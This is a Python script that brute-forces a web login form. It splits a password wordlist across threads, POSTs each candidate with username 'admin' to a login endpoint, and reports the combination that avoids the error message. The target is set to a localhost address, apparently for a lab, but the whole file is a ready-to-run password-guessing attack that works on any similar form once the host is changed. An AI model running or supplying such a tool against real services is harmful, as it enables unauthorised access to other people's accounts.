from math import ceil
from threading import Thread
from requests import post


WORDLIST = 'wordlist.txt'
ERROR_TEXT = 'Invalid user or password'
THREAD_NUM = 10
LOGIN = 'admin'

PROT = "http"
HOST = "127.0.1.1"
PORT = "5000"
PATH = "/user/login"



def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

def brute_run(url: str, login: str, wordlist: list, answers: list):
    for password in wordlist:
        data = {
            "username": login,
            "password": password
        }
        response = post(url=url, data=data)
        # print(response.status_code, response.reason)
        if not ERROR_TEXT in response.text:
            answers.append((login, password))
            return

def brute(wordlist: list, url: str, thread_num: int = 5):
    threads = []
    answers = []
    thread_num = thread_num if thread_num > 1 else 1
    payloads = list(chunks(wordlist, ceil(len(wordlist)/thread_num)))

    for payload in payloads:
        threads.append(Thread(target=brute_run, args=(url, LOGIN, payload, answers)))

    for thread in threads:
        thread.start()
    
    for thread in threads:
        thread.join()

    print("Bruted:", answers)

def main():
    url = f'{PROT}://{HOST}:{PORT}{PATH}'
    with open(WORDLIST) as file:
        brute(file.read().split('\n'), url, THREAD_NUM)
        file.close()

if __name__ == '__main__':
    main()